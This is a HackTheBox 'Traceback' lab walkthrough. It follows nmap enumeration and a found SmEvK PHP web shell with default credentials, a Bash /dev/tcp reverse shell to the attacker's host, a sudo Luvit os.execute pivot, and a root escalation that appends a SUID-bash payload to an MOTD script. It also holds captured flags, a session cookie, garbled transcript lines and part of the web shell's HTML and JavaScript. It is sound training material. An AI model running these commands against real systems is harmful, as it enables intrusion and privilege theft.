---
tags: [HTB, Traceback, Linux, Apache, PHP, WebShell, CommandInjection, Sudo, Lua, MOTD, SUID, SSH, Easy]
platform: HackTheBox
os: Ubuntu 18.04 x86_64
hostname: traceback
difficulty: Easy
ip: $BoxIP
status: Complete
---

# HTB: Traceback, Full Walkthrough

## The gist

Traceback is an easy Linux machine whose homepage openly announces that an attacker left a web shell behind. A source-code comment points toward a collection of PHP shells; targeted enumeration finds `smevk.php`. The shell uses the default `admin:admin` credentials and exposes a command console running as `webadmin`.

The `webadmin` account can run `/home/sysadmin/luvit` as `sysadmin` without a password. Luvit's `-e` option evaluates Lua, and Lua's `os.execute()` turns that permitted interpreter into command execution as `sysadmin`. The `sysadmin` group owns the `/etc/update-motd.d` scripts and has group write permission. The MOTD script is run when an SSH session is established, so it can be changed to copy `/bin/bash` to a SUID path. A fresh SSH connection runs the modified script, after which `/tmp/rootbash -p` gives an effective UID of 0.

The chain is:

```text
HTML comment / attacker clue
  -> targeted PHP-shell enumeration
  -> SmEvK default credentials (admin:admin)
  -> command execution as webadmin
  -> sudo luvit -e os.execute(...)
  -> sysadmin
  -> group-writable root-run MOTD script
  -> SSH reconnect executes the payload
  -> SUID Bash -> root
```

> [!warning] Evidence boundary
> The source transcript records the successful key-based SSH login as `webadmin`, but it does not preserve the exact earlier command that placed the public key in `authorized_keys`. This report records the observed SSH login and explains the property required by the attack: any authenticated SSH reconnect is enough to trigger the MOTD. Do not treat an unrecorded key-placement command as captured evidence.

## Box information

| Field | Value |
|---|---|
| Platform | Hack The Box |
| Difficulty | Easy |
| Operating system | Ubuntu 18.04, x86_64 |
| Hostname | `traceback` |
| Target | `$BoxIP` — the supplied transcript used `10.129.1.78` |
| Open services | TCP 22 SSH, TCP 80 HTTP |
| Web stack | Apache 2.4.29, PHP-backed SmEvK shell |
| Initial access | Exposed SmEvK PHP shell with default credentials |
| User pivot | `sudo`-allowed Luvit interpreter, Lua `os.execute()` |
| Privilege escalation | Group-writable `/etc/update-motd.d/00-header` plus SUID Bash |

## Vulnerability summary

| # | Vulnerability | Severity | Location |
|---|---|---|---|
| 1 | Attacker-left PHP web shell exposed by the public web root | Critical | `/smevk.php` |
| 2 | Default web-shell credentials | High | SmEvK login: `admin:admin` |
| 3 | Passwordless sudo to an arbitrary Lua command runner | High | `/home/sysadmin/luvit` |
| 4 | Group-writable root-executed MOTD script | Critical | `/etc/update-motd.d/00-header` |

## Evidence and loot

The source loot and transcript were read from:

`/home/kali/Platforms/HackTheBox/Traceback/`

| Evidence | Source location |
|---|---|
| Raw terminal transcript | `Traceback.log` |
| Full TCP scan | `nmap/allports.nmap` and `nmap/allports.*` |
| Service scan | `nmap/services.nmap` and `nmap/services.*` |
| HTTP enumeration | `loot/gobuster-http.txt` |
| PHP-shell name list | `loot/xh4h-shells.txt` |
| SmEvK login response | `loot/smevk-login.html` |
| Session cookie | `loot/smevk.cookies` |
| Flags | `loot/flags.txt` |

The scan, shell, and privilege evidence are retained with the private source loot. The flag values are reproduced in the private flag section below.

## Variables

Use the helper variables in a clean run. Keep target-side and local-side paths distinct. `$BoxDir` below is the manual platform workspace used by the source transcript; if running the autonomous phase, use a temporary workspace instead.

```bash
boxset BoxName Traceback
boxset BoxIP $BoxIP
boxset LocalIP $LocalIP
boxset FQDN traceback
boxset WebPort 80
boxset SSHPort 22
boxset Username webadmin
boxset Username2 sysadmin
boxset AdminUser root
boxset Port 4444
```

## 1. Initialise the session

Start the box, then capture the terminal. The transcript is part of the evidence: it records commands, output, failures, and the exact point where the shell or privilege boundary changed.

```bash
boxstart $BoxName $BoxIP htb
htblog
```

> [!tip] ⚡ More efficient path
> Start the full scan immediately and perform the first HTTP request while it runs. The scan establishes the attack surface; the page review can proceed independently.

## 2. Full TCP enumeration

The all-port scan found only SSH and HTTP.

```bash
sudo nmap -Pn -n -sS -p- --min-rate 5000 \
  --max-retries 1 --max-rtt-timeout 500ms \
  --host-timeout 2m -T4 \
  -oA "$BoxDir/nmap/allports" "$BoxIP"
```

`-p-` checks all TCP ports. `-Pn` avoids relying on ICMP, and `-n` removes DNS delay. The retry and timeout values make this a fast first pass; a suspicious or empty result should be confirmed with a slower scan.

> 📸 Screenshot: Full TCP scan with TCP/22 and TCP/80 visible.

## 3. Service and version scan

The focused scan identified OpenSSH 7.6p1 and Apache 2.4.29 on Ubuntu.

```bash
sudo nmap -Pn -n -sC -sV --version-all \
  -p22,80 -oA "$BoxDir/nmap/services" "$BoxIP"
```

Observed results:

```text
22/tcp open  ssh  OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http Apache httpd 2.4.29 (Ubuntu)
```

> 📸 Screenshot: Service scan showing SSH and Apache versions.

> [!abstract] 🧠 Why
> There is no useful SSH credential yet, so HTTP is the higher-value branch. The Apache version alone is not the exploit; the page content and application files are more important here.

> [!tip] 🛠️ Alternative tool
> RustScan can produce the initial port list quickly, but confirm the result with Nmap because Nmap's service and default-script output is the evidence used for reporting:

```bash
rustscan -a "$BoxIP" --ulimit 5000 -- -Pn -n -sC -sV
```

## 4. Review the homepage and source

Request the page with headers and save the body. The HTML does not merely contain a defacement; its comment says that “some of the best web shells” were left behind.

```bash
curl -i "http://$BoxIP:$WebPort/" | tee "$BoxDir/loot/index.headers.html"
curl -sS "http://$BoxIP:$WebPort/" -o "$BoxDir/loot/index.html"
grep -n -i -C 2 'shell\|backdoor\|Xh4H\|comment' "$BoxDir/loot/index.html"
```

The meaningful clue was:

```html
<!--Some of the best web shells that you might need ;)-->
```

> 📸 Screenshot: Homepage source with the attacker clue highlighted.

> [!hint] 💡 Hint
> When a page says an attacker left a backdoor, treat that as an enumeration instruction. Search for filenames associated with common web shells, not only conventional names such as `login.php` or `admin.php`.

Also check the usual low-noise paths:

```bash
curl -i "http://$BoxIP:$WebPort/robots.txt"
```

`robots.txt` returned 404. That is a negative result, not a reason to stop: the page source gave us a more specific next step.

## 5. Discover the exposed shell

The source transcript used Gobuster twice: first with a normal content wordlist, then with a short list of PHP-shell filenames obtained from the Xh4H Web-Shells repository.

The ordinary scan was:

```bash
gobuster dir \
  -u "http://$BoxIP:$WebPort/" \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html -t 20 \
  -o "$BoxDir/loot/gobuster-http.txt"
```

It returned ordinary files and several 403 responses, including `.htpasswd` and `.htaccess`. A 403 is still evidence that the path exists.

The targeted shell-name list was generated and then scanned:

```bash
curl -sS \
  https://api.github.com/repos/Xh4H/Web-Shells/contents \
  | grep -oP '"name":\s*"\K[^"]+\.php' \
  > "$BoxDir/loot/xh4h-shells.txt"

gobuster dir \
  -u "http://$BoxIP:$WebPort/" \
  -w "$BoxDir/loot/xh4h-shells.txt" \
  -t 10 \
  -o "$BoxDir/loot/gobuster-shells.txt"
```

The result was:

```text
smevk.php (Status: 200) [Size: 1261]
```

> 📸 Screenshot: Targeted Gobuster result identifying `smevk.php`.

> [!tip] ⚡ More efficient path
> Once the HTML comment explicitly points to web shells, the targeted 15-name scan is more efficient than repeatedly expanding a large generic wordlist. Keep the generic scan as a safety net, then pivot to the clue-specific list.

> [!tip] 🛠️ Alternative tool
> Feroxbuster handles the same path discovery with recursion and extension support:

```bash
feroxbuster -u "http://$BoxIP:$WebPort/" \
  -w "$BoxDir/loot/xh4h-shells.txt" -t 20 \
  -o "$BoxDir/loot/ferox-shells.txt"
```

## 6. Identify and authenticate to SmEvK

Requesting the file showed a SmEvK v3 login form with the fields `uname`, `pass`, and `login`.

```bash
curl -i "http://$BoxIP:$WebPort/smevk.php" \
  -o "$BoxDir/loot/smevk-login-form.html"
```

> 📸 Screenshot: SmEvK login form with the POST field names visible.

SmEvK is a known PHP web shell. Its default credentials are `admin:admin`; test them once and preserve the session cookie.

```bash
curl -sS -c "$BoxDir/loot/smevk.cookies" \
  -b "$BoxDir/loot/smevk.cookies" \
  -d 'uname=admin&pass=admin&login=Login' \
  "http://$BoxIP:$WebPort/smevk.php" \
  -o "$BoxDir/loot/smevk-login.html"

grep -i 'logout\|console\|webadmin\|invalid\|error' \
  "$BoxDir/loot/smevk-login.html"
```

The authenticated page disclosed:

```text
User: 1000 (webadmin)
Server: Apache/2.4.29 (Ubuntu)
Useful: php, perl, tar, gzip, bzip2, nc, locate
Downloaders: wget
```

> 📸 Screenshot: Authenticated SmEvK console and its disclosed execution identity.

> [!warning] 💡 Common mistake
> A successful HTTP status code is not enough. Confirm that the response contains the authenticated console and the execution user. Do not send a reverse shell until the session and the command interface are both proven.

## 7. Obtain and stabilise the web shell

SmEvK's Console action accepts the command in the `p1` field. Start a listener first, then URL-encode the complete command so the `&`, spaces, and redirects remain inside one form value.

On Kali:

```bash
nc -lvnp "$Port"
```

In a second terminal:

```bash
curl -sS -b "$BoxDir/loot/smevk.cookies" \
  --data-urlencode 'a=Console' \
  --data-urlencode 'c=/var/www/html/' \
  --data-urlencode "p1=bash -c 'bash -i >& /dev/tcp/$LocalIP/$Port 0>&1'" \
  --data-urlencode 'p2=' \
  --data-urlencode 'p3=' \
  --data-urlencode 'charset=UTF-8' \
  "http://$BoxIP:$WebPort/smevk.php" \
  >/dev/null
```

The callback landed as `webadmin` on `traceback`.

> 📸 Screenshot: Stable shell showing `id`, `whoami`, `hostname`, and `uname -a`.

Upgrade the raw netcat connection to a PTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Press `Ctrl+Z` to suspend the connection locally, then run:

```bash
stty raw -echo; fg
export TERM=xterm
```

> [!warning] 💡 TTY gotcha
> `stty raw -echo` changes the Kali terminal. If it becomes unusable, type `reset` and press Enter. A PTY is important before using editors, pagers, or an SSH-triggered workflow.

> [!tip] 🛠️ Alternative tool
> If Python is not available on the target, try:

```bash
script -qc /bin/bash /dev/null
```

> [!tip] 🛠️ Payload resource
> If the Bash `/dev/tcp` syntax does not work, use [RevShells](https://www.revshells.com/) to generate a payload matching the interpreter actually available on the target. `/dev/tcp` is Bash-specific; it is not a universal POSIX shell feature.

## 8. Initial local enumeration

Confirm the account and host before searching for privilege paths:

```bash
id
whoami
hostname
uname -a
cat /etc/passwd | grep -v nologin | grep -v false
ls -la /home
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

The interactive accounts were:

```text
root      /root       /bin/bash
webadmin  /home/webadmin /bin/bash
sysadmin  /home/sysadmin /bin/sh
```

The important local relationship was that `webadmin` could use one exact sudo rule:

```text
(sysadmin) NOPASSWD: /home/sysadmin/luvit
```

> 📸 Screenshot: `sudo -l` showing the passwordless Luvit rule.

> [!abstract] 🧠 Why
> A NOPASSWD rule to a scripting language or interpreter is usually more powerful than its name suggests. The next question is whether the interpreter accepts inline code, a script path, a module path, or an environment-controlled command.

## 9. Pivot from webadmin to sysadmin with Luvit

First run the permitted binary's help option. Then prove the run-as identity with Lua's `os.execute()`:

```bash
sudo -u sysadmin /home/sysadmin/luvit --help
sudo -u sysadmin /home/sysadmin/luvit \
  -e 'os.execute("id")'
```

The output confirmed UID 1001 and user `sysadmin`. The note in the webadmin home directory reinforced the intended clue:

```bash
sudo -u sysadmin /home/sysadmin/luvit \
  -e 'os.execute("cat /home/webadmin/note.txt")'
```

The key Lua primitive is:

```lua
os.execute("id")
```

`-e` evaluates the code, and `os.execute()` asks the operating system to run the string. This is command execution with the effective identity granted by sudo.

> [!warning] 💡 Common mistake
> Do not try `sudo -u sysadmin /bin/bash` unless the sudo rule explicitly permits Bash. Sudo checks the allowed command path. Use the permitted Luvit binary, then make the interpreter execute the command.

> [!tip] ⚡ More efficient path
> The shortest proof is `sudo -u sysadmin /home/sysadmin/luvit -e 'os.execute("id")'`. Once it returns UID 1001, stop testing Lua syntax and enumerate the new user's file ownership and group privileges.

> [!tip] 🛠️ Alternative tool
> For any allowed interpreter, search [GTFOBins](https://gtfobins.github.io/) for its `sudo` or command-execution section. For unfamiliar interpreters, run `--help`, inspect whether inline evaluation exists, and test a harmless `id` command.

## 10. Inspect the MOTD permissions

From the successful SSH session, the MOTD directory contained scripts owned by `root:sysadmin` with group write permission:

```bash
ls -la /etc/update-motd.d/
```

The critical permissions were:

```text
-rwxrwxr-x 1 root sysadmin ... 00-header
```

`00-header` is executed during the SSH login process. Because it is writable through the `sysadmin` group, code appended to it will run in the privileged context used to generate the MOTD.

> 📸 Screenshot: `/etc/update-motd.d/` showing `root sysadmin` ownership and group write permission.

> [!abstract] 🧠 Why
> The escalation is not “MOTD is interesting” by itself. The full evidence chain is: (1) a login-triggered script, (2) root-owned execution, (3) write permission available to a user we can reach, and (4) a reliable way to cause a new login.

## 11. Back up and modify the MOTD script

Use Luvit as `sysadmin` to make a backup and append a short payload. The backup is essential for clean-down.

```bash
sudo -u sysadmin /home/sysadmin/luvit \
  -e 'os.execute("cp /etc/update-motd.d/00-header /home/sysadmin/00-header.bak")'

sudo -u sysadmin /home/sysadmin/luvit \
  -e 'os.execute("printf \"\ncp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash\n\" >> /etc/update-motd.d/00-header")'

tail -n 5 /etc/update-motd.d/00-header
```

The appended commands cause the privileged MOTD execution to copy Bash and set mode `4755`:

```text
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
```

> [!warning] 💡 Quoting gotcha
> Nested shell and Lua quoting is easy to break. If the `printf` command does not append the line, inspect the file with `tail`, adjust the quoting, and use a harmless marker before reattempting the privilege payload. Never assume a command ran merely because Luvit returned `true`.

> [!tip] ⚡ More efficient path
> Use one `printf` append with an explicit newline and verify with `tail`. This avoids interactively editing a root-run script and leaves a clear reversible backup.

> [!tip] 🛠️ Alternative tool
> If quoting through Lua becomes awkward, create a short script locally, transfer it through the already available web-shell channel, and have Luvit execute a command that appends the controlled file. The privilege boundary remains the same; only delivery changes. Use [CyberChef](https://gchq.github.io/CyberChef/) or shell quoting tests to validate encoded content before sending it.

## 12. Trigger the MOTD and obtain root

The script runs when SSH generates the login message. The transcript shows a key-based SSH reconnect as `webadmin`; a clean run can use any authenticated SSH method available on the target. The exact credential mechanism is not the escalation itself—the fresh login is.

From Kali:

```bash
ssh -i ~/.ssh/id_rsa \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  webadmin@$BoxIP 'true'
```

Back in the target shell, verify the helper:

```bash
ls -la /tmp/rootbash
/tmp/rootbash -p -c 'id && whoami'
```

Expected proof shape:

```text
-rwsr-xr-x 1 root root ... /tmp/rootbash
uid=1000(webadmin) gid=1000(webadmin) euid=0(root) ...
root
```

The `-p` option tells Bash to preserve its effective UID. Without `-p`, Bash may drop the SUID privilege when launched by a non-root real UID.

> 📸 Screenshot: Successful SSH reconnect as `webadmin`, showing the fresh MOTD execution trigger.

> 📸 Screenshot: `/tmp/rootbash` with SUID root permissions and `euid=0(root)` proof.

> [!hint] 💡 Why the fresh connection matters
> Editing `00-header` only plants the payload. The privileged execution happens on the next SSH login, so a missing `/tmp/rootbash` immediately after editing does not prove failure. Trigger the event, then check the output file and its mode.

> [!tip] 🛠️ Alternative tool
> The same verification can be performed with `ssh webadmin@$BoxIP 'true'` when password authentication is available. If you do not have a working SSH credential, return to the foothold shell and establish an authorised key or password path before treating the MOTD route as blocked.

## 13. Collect the flags

Once `euid=0` was confirmed, the transcript read the user flag from `sysadmin`'s home and the root flag from `/root`. The values were saved privately with `loot flag`.

```bash
/tmp/rootbash -p -c 'cat /home/sysadmin/user.txt'
/tmp/rootbash -p -c 'cat /root/root.txt'
loot flag user "6483d0db98270fe39ae6ac640419d7ae"
loot flag root "416c4745f987bf543c3786e6fa8c639c"
```

The source values are also reproduced in the private Flags section below. The original source values are retained in:

`/home/kali/Platforms/HackTheBox/Traceback/loot/flags.txt`

> 📸 Screenshot placeholder: Recreate one proof frame containing `id`, `whoami`, `hostname`, and `/root/root.txt`. The supplied source contains root identity/SUID evidence and the private flag record, but no dedicated combined root-flag screenshot.



### Captured flag values from source loot

### Captured flag values from source loot


#### `loot/flags.txt`

```text
user: 6483d0db98270fe39ae6ac640419d7ae
root: 416c4745f987bf543c3786e6fa8c639c
```

## 14. Clean down

The source transcript records `boxdone`. For a clean manual run, remove only the artifacts created during the exercise and restore the file that was modified.

On the target, from the privileged shell:

```bash
rm -f /tmp/rootbash
cp /home/sysadmin/00-header.bak /etc/update-motd.d/00-header
rm -f /home/sysadmin/00-header.bak
```

Verify the restore:

```bash
tail -n 5 /etc/update-motd.d/00-header
stat -c '%U:%G %A %n' /etc/update-motd.d/00-header
test ! -e /tmp/rootbash && echo 'rootbash removed'
```

Do not remove a pre-existing SSH key or delete the entire `authorized_keys` file. If this run added one line, restore the original file or remove only the recorded line after comparing it with the backup.

On Kali:

```bash
ss -ltnp | grep ':4444' || true
boxdone
```

> [!warning] 💡 Cleanup boundary
> `00-header` is a real system file. Restore it from the backup before closing the box. If the box is reset instead of cleaned manually, record that reset and do not claim the target-side restore was verified.

## 15. Attack narrative in one page

1. Nmap found TCP/22 and TCP/80.
2. The homepage's HTML comment disclosed that web shells had been left behind.
3. A targeted PHP-shell filename scan found `/smevk.php`.
4. `admin:admin` authenticated to SmEvK, giving command execution as `webadmin`.
5. `sudo -l` exposed passwordless execution of `/home/sysadmin/luvit` as `sysadmin`.
6. Luvit's `-e` option plus Lua `os.execute()` executed commands as `sysadmin`.
7. `/etc/update-motd.d/00-header` was writable by the `sysadmin` group and executed on SSH login.
8. A controlled MOTD append copied Bash to `/tmp/rootbash` and set SUID mode.
9. A fresh SSH reconnect triggered the MOTD; `/tmp/rootbash -p` produced `euid=0`.
10. Both flags were collected privately, cleanup was recorded, and `boxdone` completed.

## Tools used

| Tool | Purpose |
|---|---|
| `nmap` | Full TCP and version/service enumeration |
| `curl` | HTTP source review, SmEvK authentication, and command delivery |
| `gobuster` | Generic and clue-specific web content discovery |
| `netcat` | Reverse-shell listener |
| `Python PTY` | Shell stabilisation |
| `sudo` | Exact run-as rule enumeration and Luvit pivot |
| `Luvit` | Lua inline evaluation and OS command execution as `sysadmin` |
| `ssh` | Authenticated reconnect to trigger MOTD execution |

## Credentials and secrets

| Account | Credential | Service | Source/notes |
|---|---|---|---|
| SmEvK | `admin:admin` | HTTP `/smevk.php` | Default web-shell credentials |
| `webadmin` | Key-based SSH access observed | SSH/22 | Exact key-placement command was not captured in the transcript |


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxName="Traceback"
export BoxIP="10.129.1.78"
export BoxPlatform="HackTheBox"
export BoxDir="/home/kali/Platforms/HackTheBox/Traceback"
export Domain=""
export DCip=""
export Username=webadmin
export Password=""
export Username2=""
export Password2=""
export Username3=""
export Password3=""
export Hash=""
export NThash=""
export Port="4444"
export Port2="4445"
export Lport="4444"
export TransferPort="8000"
export WebPort=80
export OpenPorts=""
export Product=""
export Version=""
export ExploitId=""
export ExploitFile=""
export ExploitName=""
export URL=""
export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

#### `loot/smevk.cookies`

```text
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

10.129.1.78	FALSE	/	FALSE	0	PHPSESSID	j91gt98vjigruvtlfn2p875ivb
```

### Sensitive transcript evidence

```text
[sudo] password for kali:
.htpasswd            (Status: 403) [Size: 295]
.htpasswd.php        (Status: 403) [Size: 299]
.htpasswd.html       (Status: 403) [Size: 300]
.htpasswd.txt        (Status: 403) [Size: 299]
Set-Cookie: PHPSESSID=sces6jchgt8s8pekd2q7hn22vr; path=/
$ [16:19:37] curl -sS -c loot/smevk.cookies -b loot/smevk.cookies \
        Password :  <input type="password" name="pass" ><br>
kali@kali:~/Platforms/HackTheBox/Traceback [16:17:39] $ =curl -sS -c loot/smevk.cookies -b loot/smevk.cookies \
$ [16:27:19] curl -sS -b loot/smevk.cookies \
kali@kali:~/Platforms/HackTheBox/Traceback [16:23:42] $ curl -sS -b loot/smevk.cookies \
  "http://$BoxIP/smevk.php" &curlloot/smevk.cookies'a=Console''c=/var/www/html/'"p1=bash -c 'bash -i >& /dev/tcp/$LocalIP/$Port 0>&1'"'p2=''p3=''charset=UTF-8'"http://$BoxIP/smevk.php"r o P $ $ 4 0>&1'" \4 0>&1'" \4 0>&1'" \4 0>&1'" \>
webadmin@traceback:/var/www/html$ cat /etc/passwd | grep -v nologin | grep -v fal
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
$ [16:35:21] ssh -i ~/.ssh/id_rsa webadmin@$BoxIP
kali@kali:~/Platforms/HackTheBox/Traceback [16:34:21] $ =ssh -i ~/.ssh/id_rsa webadmin@$BoxIPssh~/.ssh/id_rsa>
$ [16:39:14] ssh -i ~/.ssh/id_rsa webadmin@$BoxIP 'true'
$ [16:40:25] ssh -i ~/.ssh/id_rsa webadmin@$BoxIP 'true'
$ [16:42:22] loot flag user 6483d0db98270fe39ae6ac640419d7ae
kali@kali:~/Platforms/HackTheBox/Traceback [16:39:12] $ =ssh -i ~/.ssh/id_rsa webadmin@$BoxIP 'true'ssh~/.ssh/id_rsa'true'>
kali@kali:~/Platforms/HackTheBox/Traceback [16:39:32] $ =ssh -i ~/.ssh/id_rsa webadmin@$BoxIP 'true'ssh~/.ssh/id_rsa'true'>
[+] Flag saved:  user = 6483d0db98270fe39ae6ac640419d7ae  →  loot/flags.txt
]0;webadmin@traceback: ~webadmin@traceback:~$ ssh -i ~/.ssh/id_rsa webadmin@$BoxIP 'true'
Warning: Identity file /home/webadmin/.ssh/id_rsa not accessible: No such file or directory.
$ [16:43:57] loot flag root 416c4745f987bf543c3786e6fa8c639c
```

### Additional captured source values

#### `loot/smevk-login.html`

```text
<html><head><link href='https://fonts.googleapis.com/css?family=Josefin+Sans:400,100' rel='stylesheet' type='text/css'></head><html>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>SmEvK v3</title>
<style>
        body {background-color:black;color:#fff;}
        body,td,th    { font-family: Josefin Sans, sans-serif;font-size:13px;margin:0;vertical-align:top; }
        span,h1,a    { color:#8B008B !important; }
        span        { font-weight: bolder; }
        h1            { padding: 0px 5px;font: 14pt audiowide;margin:0px 0 0 0px; }
        div.content    { padding: 0px;margin:0 0px;background: #0F1010;border:1px solid #8B008B; border-radius:5px;}
        a            { text-decoration:none;   }
        a:hover        { border-bottom:0px solid #5e5e5e;text-decoration:none; }
        a:hover{cursor: url("http://downloads.totallyfreecursors.com/cursor_files/pakistan.ani"), url("http://downloads.totallyfreecursors.com/thumbnails/PAKISTAN.gif"), auto;text-decoration:none;}
        .ml1        { border:1px solid #8B008B;padding:px;margin:0;overflow: auto; }
        .bigarea    { width:100%;height:250px;margin-top:0px; border-radius:10px; border-color:#8B008B; background:#2F2F2F;}
        input, textarea, select    { margin-top:0;color:#63E1FF;background-color:black;border-radius:5px;border:1px solid #8B008B; border-radis:5px;font: 10pt arial,"Courier New"; }
        input[type="button"]:hover,input[type="submit"]:hover {background-color:#094F60;color:black;text-decoration:none;}
        form        { margin:0px; background:#0F1010;}
        #toolsTbl    { text-align:center; }
        .toolsInp    { width: 80%; background:black; border-radius:5px; border-color:#8B008B; }
        .main th    {text-align:left;background-color:#0E5061;}
        .main tr:hover{background:#8B008B; border:5px solid;border-color:#8B008B;}
        .main td, th{vertical-align:middle;}
        .menu { height:30px; border-radius:10px;}
        .menu th{padding:1px;border-radius: 5px;  background:#0E5061;     -webkit-transform: rotate(20deg);
    -moz-transform: rotate(20deg);
    -o-transform: rotate(20deg);
    -ms-transform: rotate(20deg);
    transform: rotate(20deg);}
        .menu th:hover{background:#0F1010;text-decoration: none;}
                pre {font-family: Josefin Sans, sans-serif;color:#FFFFFF;}
        #cot_tl_fixed{position:fixed;bottom:0px;font-size:12px;left:0px;padding:4px 0;clip:_top:expression(document.documentElement.scrollTop+document.documentElement.clientHeight-this.clientHeight);_left:expression(document.documentElement.scrollLeft + document.documentElement.clientWidth - offsetWidth);}


        .cpr {margin-bottom:5px;font-weight:bold; }
        .cpb {width:34px;margin:0 5px;}

        .npoad td {padding:0;}
        #Smevktools{
        margin-top:50px;
        width:500px;
        border:1px solid;
        border-radius:10px;
    }
    .smevklogo td{
        font-size:12px;
        font-weight:bold;



    }
    .smevklogo{
        margin-left:5px;
        background:url(/bg.jpg);
        background-repeat: no-repeat;
       background-position: CENTER;
        background-color:#0F1010;
        background-size: 400px 120px;



    }
    </style>

</html>
<style type="text/css">body, a:hover {text-decoration:none;cursor: url(http://cur.cursors-4u.net/cursors/cur-11/cur1054.cur), progress !important;}</style><a href="http://www.cursors-4u.com/cursor/2012/02/11/chrome-pointer.html" target="_blank" title="Chrome Pointer"><img src="http://cur.cursors-4u.net/cursor.png" border="0" alt="Chrome Pointer" style="position:absolute; top: 0px; right: 0px;" /></a>
    <script>
        function set(a,c,p1,p2,p3,charset) {
            if(a != null)document.mf.a.value=a;
            if(c != null)document.mf.c.value=c;
            if(p1 != null)document.mf.p1.value=p1;
            if(p2 != null)document.mf.p2.value=p2;
            if(p3 != null)document.mf.p3.value=p3;
            if(charset != null)document.mf.charset.value=charset;
        }
        function g(a,c,p1,p2,p3,charset) {
            set(a,c,p1,p2,p3,charset);
            document.mf.submit();
        }
        function a(a,c,p1,p2,p3,charset) {
            set(a,c,p1,p2,p3,charset);
            var params = "ajax=true";
            for(i=0;i<document.mf.elements.length;i++)
                params += "&"+document.mf.elements[i].name+"="+encodeURIComponent(document.mf.elements[i].value);
            sr("/smevk.php", params);
        }
        function sr(url, params) {
            if (window.XMLHttpRequest) {
                req = new XMLHttpRequest();
                req.onreadystatechange = processReqChange;
                req.open("POST", url, true);
                req.setRequestHeader ("Content-Type", "application/x-www-form-urlencoded");
                req.send(params);
            }
            else if (window.ActiveXObject) {
                req = new ActiveXObject("Microsoft.XMLHTTP");
                if (req) {
                    req.onreadystatechange = processReqChange;
                    req.open("POST", url, true);
                    req.setRequestHeader ("Content-Type", "application/x-www-form-urlencoded");
                    req.send(params);
                }
            }
        }
        function processReqChange() {
            if( (req.readyState == 4) )
                if(req.status == 200) {
                    //alert(req.responseText);
                    var reg = new RegExp("(\d+)([\S\s]*)", "m");
                    var arr=reg.exec(req.responseText);
                    eval(arr[2].substr(0, arr[1]));
                }
                else alert("Request error!");
        }
    </script>
    <head><link href="https://fonts.googleapis.com/css?family=Audiowide" ></head><body><div style="position:absolute;width:100%;top:0;left:0;"><div style="margin:5px;background:black;"><div class="content" style="border:1px solid #8B008B; border-radius:5px;">
    <form method=post name=mf style="display:none;">
        <input type=hidden name=a value="FilesMan">
        <input type=hidden name=c value="/var/www/html/">
        <input type=hidden name=p1 value="">
        <input type=hidden name=p2 value="">
        <input type=hidden name=p3 value="">
        <input type=hidden name=charset value="UTF-8">
    </form><div class="smevklogo"><table class="info" cellpadding="0" cellspacing="0" width="100%"><tr>
          <td><table cellpadding="3" cellspacing="0" class="npoad"><tr><td width="80px;"><span>Uname</span></td><td>: <nobr>Linux traceback 4.15.0-58-generic #64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019 x86_64</nobr></td></tr>
          <tr><td><span>User</span></td><td>: 1000 ( webadmin ) <span>Group: </span> 1000 ( webadmin )</td></tr><tr><td><span>Server</span></td><td>: Apache/2.4.29 (Ubuntu)</td></tr><tr><td><span>Useful</span></td><td>: php, perl, tar, gzip, bzip2, nc, locate</td></tr><tr><td><span>Downloaders</span></td><td>: wget</td></tr><tr><td><span>D/functions</span></td><td>: pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,</td></tr><tr><td><span>Cwd</span></td><td>: <a href='#' onclick='g("FilesMan","/")'>/</a><a href='#' onclick='g("FilesMan","/var/")'>var/</a><a href='#' onclick='g("FilesMan","/var/www/")'>www/</a><a href='#' onclick='g("FilesMan","/var/www/html/")'>html/</a> <font color=#00BB00><b>drwxr-xr-x</b></font> <a href=# onclick="g('FilesMan','/var/www/html','','','')">[ home ]</a></td></tr></table></td><td width=4><nobr><span>Sv IP</span><br><span>Your IP</span><br /><span>HDD</span><br /><span>Free</span><br /><span>PHP</span><br /><span>Safe Mode</span><br /><span>Domains</span></nobr></td><td><nobr>: 10.129.1.78<br>: 10.10.14.7<br />: 8.25 GB<br />: 5.57 GB (67%)<br>: 7.2.19-0ubuntu0.18.04.2 <a href=# onclick="g('Php',null,null,'info')">[ phpinfo ]</a><br />: <font color=#8B008B<b>OFF</b></font><br />: 1</nobr></td></tr></table></div></div></div><div style="margin:5;background:black;"><div class="content" style="border-top:5px solid 430303;padding:2px;"><table cellpadding="3" cellspacing="0" width="100%" class="menu"><tr><th><a href="#" onclick="g('SecInfo',null,'','','')">Sec. Info</a></th><th><a href="#" onclick="g('FilesMan',null,'','','')">Files</a></th><th><a href="#" onclick="g('Console',null,'','','')">Console</a></th><th><a href="#" onclick="g('SafeMode',null,'','','')">Bypasser</a></th><th><a href="#" onclick="g('Bypass',null,'','','')">Safe Mode</a></th><th><a href="#" onclick="g('StringTools',null,'','','')">String tools</a></th><th><a href="#" onclick="g('ImportScripts',null,'','','')">Import Scripts</a></th><th><a href="#" onclick="g('Network',null,'','','')">Network</a></th><th><a href="#" onclick="g('Readable',null,'','','')">Readable Dirs</a></th><th><a href="#" onclick="g('Deface',null,'','','')">Defacer</a></th><th><a href="#" 